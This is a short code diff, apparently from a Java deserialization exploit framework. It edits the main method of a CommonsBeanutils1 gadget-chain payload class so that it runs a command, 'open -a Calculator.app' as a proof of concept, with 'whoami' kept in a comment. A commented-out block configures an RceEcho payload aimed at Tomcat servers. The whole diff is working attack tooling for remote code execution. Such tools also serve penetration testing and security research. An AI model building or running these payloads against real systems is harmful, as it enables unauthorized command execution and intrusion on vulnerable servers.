@@ -24,12 +24,23 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
         SinksHelper sinksHelper = new SinksHelper();
         sinksHelper.setSink(CommonsBeanutils1.class.getAnnotation(Sink.class).value()[0]);
         sinksHelper.setEnchant(EnchantType.DEFAULT);
-        sinksHelper.setCBVersion("1.8.3");
+//        sinksHelper.setCBVersion("1.8.3");
         sinksHelper.setCommand("open -a Calculator.app");
+//        sinksHelper.setCommand("whoami");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
-        javaClassHelper.setExtendsAbstractTranslet(true);
+//        javaClassHelper.setExtendsAbstractTranslet(true);
+//        javaClassHelper.setRandomJavaClassName(true);
         sinksHelper.setJavaClassHelper(javaClassHelper);
         PayloadRunner.run(CommonsBeanutils1.class, args, sinksHelper);
+
+//        SinksHelper sinksHelper = new SinksHelper();
+//        sinksHelper.setSink(CommonsBeanutils1.class.getAnnotation(Sink.class).value()[0]);
+//        sinksHelper.setEnchant(EnchantType.JavaClass);
+//        JavaClassHelper javaClassHelper = new JavaClassHelper();
+//        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.RceEcho);
+//        javaClassHelper.setMiddleware(Middleware.Tomcat);
+//        sinksHelper.setJavaClassHelper(javaClassHelper);
+//        PayloadRunner.run(CommonsBeanutils1.class, args, sinksHelper);
     }
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
